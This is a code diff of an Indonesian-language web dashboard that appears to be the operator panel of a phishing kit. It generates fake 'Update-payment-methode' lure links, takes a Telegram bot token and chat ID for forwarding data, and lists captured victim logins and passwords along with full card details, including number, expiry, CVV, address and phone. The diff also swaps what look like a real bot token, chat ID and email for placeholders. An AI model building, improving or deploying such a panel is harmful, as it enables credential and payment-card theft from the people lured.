@@ -21,7 +21,7 @@
             z-index: 0;
             pointer-events: none;
         }
-        .bg-logo img { width: 1000px; height: 1000px; }
+        .bg-logo img { width: 3000px; height: 3000px; }
         .wadah { position: relative; z-index: 1; max-width: 700px; margin: 0 auto; }
         .header { text-align: center; margin-bottom: 30px; }
         .header h1 { font-size: 26px; color: #1a1a1f; margin-bottom: 5px; }
@@ -52,39 +52,39 @@
         }
         .salin-btn {
             margin-top: 8px;
-            padding: 6px 12px;
+            padding: 8px 16px;
             background: #0071e3;
             color: #fff;
             border: none;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 13px;
+            font-size: 14px;
         }
         button {
             padding: 12px 24px; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
             transition: all 0.2s; margin-top: 15px;
         }
-        .btn-simpan { background: #0071e3; color: #fff; }
-        .btn-simpan:hover { background: #0077ed; }
+        .btn-acak { background: #0071e3; color: #fff; margin-top: 0; }
         .btn-refresh { background: #34c759; color: #fff; margin-right: 10px; }
         .btn-refresh.aktif { background: #ff3b30; }
-        .btn-refresh:hover { opacity: 0.9; }
-        .info { margin-top: 12px; font-size: 13px; color: #555; }
-        .berhasil { color: #34c759; font-weight: 600; margin-top: 10px; display: none; }
+        .btn-refresh:hover, .btn-acak:hover, .salin-btn:hover { opacity: 0.9; }
+        .info { margin-top: 12px; font-size: 13px; color: #555; line-height: 1.6; }
+        .berhasil { color: #34c759; font-weight: 600; margin-top: 10px; display: none; font-size: 13px; }
         .daftar-data { margin-top: 15px; }
         .item {
-            padding: 12px; background: #f8f9fa; border-radius: 6px; margin-bottom: 10px;
-            border-left: 3px solid #0071e3; word-break: break-all; font-size: 13px;
+            padding: 14px; background: #f8f9fa; border-radius: 6px; margin-bottom: 10px;
+            border-left: 3px solid #0071e3; word-break: break-all; font-size: 13px; line-height: 1.8;
         }
-        .item span { font-weight: 600; color: #333; }
+        .item span { font-weight: 600; color: #333; display: inline-block; min-width: 90px; }
         .status-refresh {
-            display: inline-block; margin-left: 10px; font-size: 12px; padding: 3px 8px;
-            border-radius: 10px; background: #e5e5e7; color: #666;
+            display: inline-block; margin-left: 10px; font-size: 12px; padding: 4px 10px;
+            border-radius: 12px; background: #e5e5e7; color: #666; font-weight: 600;
         }
         .status-refresh.aktif { background: #34c759; color: #fff; }
-        .waktu { font-size: 11px; color: #888; margin-top: 5px; }
+        .waktu { font-size: 12px; color: #888; margin-top: 8px; }
         .baris-dua { display: flex; gap: 12px; }
         .baris-dua > div { flex: 1; }
+        .kosong { color: #999; font-size: 13px; padding: 10px 0; }
     </style>
 </head>
 <body>
@@ -106,10 +106,10 @@
             <input type="email" id="emailTujuan" placeholder="jandaanaksatu777@gmail.com" oninput="simpanOtomatis()">
             
             <label>Telegram Bot Token</label>
-            <input type="text" id="botToken" placeholder="8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk" oninput="simpanOtomatis()">
+            <input type="text" id="botToken" placeholder="xxx:yyy" oninput="simpanOtomatis()">
             
             <label>Telegram Chat ID</label>
-            <input type="text" id="chatIdTelegram" placeholder="7808815199" oninput="simpanOtomatis()">
+            <input type="text" id="chatIdTelegram" placeholder="123456789" oninput="simpanOtomatis()">
 
             <p class="berhasil" id="pesanBerhasil">✅ Tersimpan Otomatis!</p>
             <p class="info">Semua perubahan tersimpan langsung, tidak hilang saat di-refresh</p>
@@ -121,8 +121,8 @@
             
             <label>Nomor Acak</label>
             <div class="baris-dua">
-                <input type="number" id="paramAngka" placeholder="123456" oninput="buatTautan()">
-                <button style="margin-top:0; padding:12px 16px; background:#0071e3; color:#fff;" onclick="acakAngka()">🎲 Acak</button>
+                <input type="number" id="paramAngka" placeholder="123456" oninput="simpanAngkaLaluBuat()">
+                <button class="btn-acak" onclick="acakAngka()">🎲 Acak</button>
             </div>
 
             <label>Tautan Lengkap</label>
@@ -130,9 +130,9 @@
                 Isi nomor di atas...
             </div>
             <button class="salin-btn" onclick="salinTautan()">📋 Salin Tautan</button>
-            <p class="info" style="margin-top:8px;">
+            <p class="info" style="margin-top:10px;">
                 Format: <code>?Update-payment-methode-EMAIL-ANGKA=aktif</code><br>
-                Ganti <strong>EMAIL</strong> dengan alamat yang diinginkan, <strong>ANGKA</strong> otomatis diganti
+                Ganti <strong>EMAIL</strong> dengan alamat tujuan, <strong>ANGKA</strong> otomatis
             </p>
         </div>
 
@@ -151,7 +151,7 @@
         <div class="kotak">
             <h2>📧 Data Login Masuk</h2>
             <div class="daftar-data" id="daftarLogin">
-                <p style="color:#888; font-size:13px;">Belum ada data...</p>
+                <p class="kosong">Belum ada data...</p>
             </div>
         </div>
 
@@ -159,7 +159,7 @@
         <div class="kotak">
             <h2>💳 Data Kartu Masuk</h2>
             <div class="daftar-data" id="daftarKartu">
-                <p style="color:#888; font-size:13px;">Belum ada data...</p>
+                <p class="kosong">Belum ada data...</p>
             </div>
         </div>
     </div>
@@ -168,19 +168,24 @@
         let intervalRefresh = null;
         const INTERVAL_DETIK = 10;
 
-        // === MUAT DATA SAAT BUKA HALAMAN ===
+        // === MUAT SEMUA SAAT BUKA HALAMAN ===
         document.addEventListener('DOMContentLoaded', function() {
+            // Pengaturan dasar
             document.getElementById('websiteUrl').value = localStorage.getItem('websiteUrl') || '';
             document.getElementById('emailTujuan').value = localStorage.getItem('emailTujuan') || '';
             document.getElementById('botToken').value = localStorage.getItem('botTokenTelegram') || '';
             document.getElementById('chatIdTelegram').value = localStorage.getItem('chatIdTelegram') || '';
+            
+            // Nomor acak & parameter — TETAP TERSIMPAN
+            const simpanAngka = localStorage.getItem('paramAngka');
+            if (simpanAngka) document.getElementById('paramAngka').value = simpanAngka;
             
             tampilkanDataMasuk();
             perbaruiWaktuTerakhir();
             buatTautan();
         });
 
-        // === SIMPAN OTOMATIS SAAT DIUBAH ===
+        // === SIMPAN OTOMATIS PENGATURAN ===
         function simpanOtomatis() {
             localStorage.setItem('websiteUrl', document.getElementById('websiteUrl').value.trim());
             localStorage.setItem('emailTujuan', document.getElementById('emailTujuan').value.trim());
@@ -191,6 +196,20 @@
             pesan.style.display = 'block';
             setTimeout(() => pesan.style.display = 'none', 1500);
             
+            buatTautan();
+        }
+
+        // === SIMPAN ANGKA + BUAT TAUTAN ===
+        function simpanAngkaLaluBuat() {
+            localStorage.setItem('paramAngka', document.getElementById('paramAngka').value.trim());
+            buatTautan();
+        }
+
+        // === BUAT ANGKA ACAK ===
+        function acakAngka() {
+            const acak = Math.floor(Math.random() * 900000) + 100000;
+            document.getElementById('paramAngka').value = acak;
+            localStorage.setItem('paramAngka', acak); // Langsung simpan
             buatTautan();
         }
 
@@ -208,13 +227,6 @@
             hasil.innerHTML = `${url}/?Update-payment-methode-EMAIL-${angka}=aktif`;
         }
 
-        // === BUAT ANGKA ACAK ===
-        function acakAngka() {
-            const acak = Math.floor(Math.random() * 900000) + 100000;
-            document.getElementById('paramAngka').value = acak;
-            buatTautan();
-        }
-
         // === SALIN TAUTAN ===
         function salinTautan() {
             const teks = document.getElementById('tautanHasil').innerText;
@@ -225,13 +237,12 @@
             }
         }
 
-        // === REFRESH OTOMATIS — DIPERBAIKI ===
+        // === REFRESH OTOMATIS ===
         function toggleRefreshOtomatis() {
             const tombol = document.getElementById('tombolRefreshOtomatis');
             const status = document.getElementById('statusRefresh');
             
             if (intervalRefresh) {
-                // MATIKAN
                 clearInterval(intervalRefresh);
                 intervalRefresh = null;
                 tombol.textContent = '▶️ Mulai Refresh Setiap 10 Detik';
@@ -239,7 +250,6 @@
                 status.textContent = 'Nonaktif';
                 status.classList.remove('aktif');
             } else {
-                // NYALAKAN — langsung perbarui sekali
                 tampilkanDataMasuk();
                 perbaruiWaktuTerakhir();
                 intervalRefresh = setInterval(function() {
@@ -253,19 +263,20 @@
             }
         }
 
-        // === TAMPILKAN DATA ===
+        // === TAMPILKAN DATA — DIPERBAIKI ===
         function tampilkanDataMasuk() {
             // Data Login
             const daftarLogin = document.getElementById('daftarLogin');
             const dataLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
+            
             if (dataLogin.length === 0) {
-                daftarLogin.innerHTML = '<p style="color:#888; font-size:13px;">Belum ada data...</p>';
+                daftarLogin.innerHTML = '<p class="kosong">Belum ada data...</p>';
             } else {
                 daftarLogin.innerHTML = dataLogin.map(d => `
                     <div class="item">
-                        <span>📧 Email:</span> ${d.email}<br>
-                        <span>🔑 Kata Sandi:</span> ${d.sandi}<br>
-                        <span>🕐 Waktu:</span> ${d.waktu}
+                        <span>📧 Email:</span> ${d.email || '-'}<br>
+                        <span>🔑 Kata Sandi:</span> ${d.sandi || '-'}<br>
+                        <span>🕐 Waktu:</span> ${d.waktu || '-'}
                     </div>
                 `).join('');
             }
@@ -273,19 +284,20 @@
             // Data Kartu
             const daftarKartu = document.getElementById('daftarKartu');
             const dataKartu = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
+            
             if (dataKartu.length === 0) {
-                daftarKartu.innerHTML = '<p style="color:#888; font-size:13px;">Belum ada data...</p>';
+                daftarKartu.innerHTML = '<p class="kosong">Belum ada data...</p>';
             } else {
                 daftarKartu.innerHTML = dataKartu.map(d => `
                     <div class="item">
-                        <span>📧 Email:</span> ${d.email}<br>
-                        <span>👤 Nama:</span> ${d.namaKartu}<br>
-                        <span>🔢 Kartu:</span> ${d.nomorKartu}<br>
-                        <span>📅 Exp:</span> ${d.expiry}<br>
-                        <span>🔒 CVV:</span> ${d.cvv}<br>
-                        <span>📍 Alamat:</span> ${d.alamat}, ${d.kota} — ${d.kodepos}<br>
-                        <span>📞 Telp:</span> ${d.telepon}<br>
-                        <span>🕐 Waktu:</span> ${d.waktu}
+                        <span>📧 Email:</span> ${d.email || '-'}<br>
+                        <span>👤 Nama:</span> ${d.namaKartu || '-'}<br>
+                        <span>🔢 Kartu:</span> ${d.nomorKartu || '-'}<br>
+                        <span>📅 Exp:</span> ${d.expiry || '-'}<br>
+                        <span>🔒 CVV:</span> ${d.cvv || '-'}<br>
+                        <span>📍 Alamat:</span> ${d.alamat || '-'}, ${d.kota || ''} — ${d.kodepos || '-'}<br>
+                        <span>📞 Telp:</span> ${d.telepon || '-'}<br>
+                        <span>🕐 Waktu:</span> ${d.waktu || '-'}
                     </div>
                 `).join('');
             }
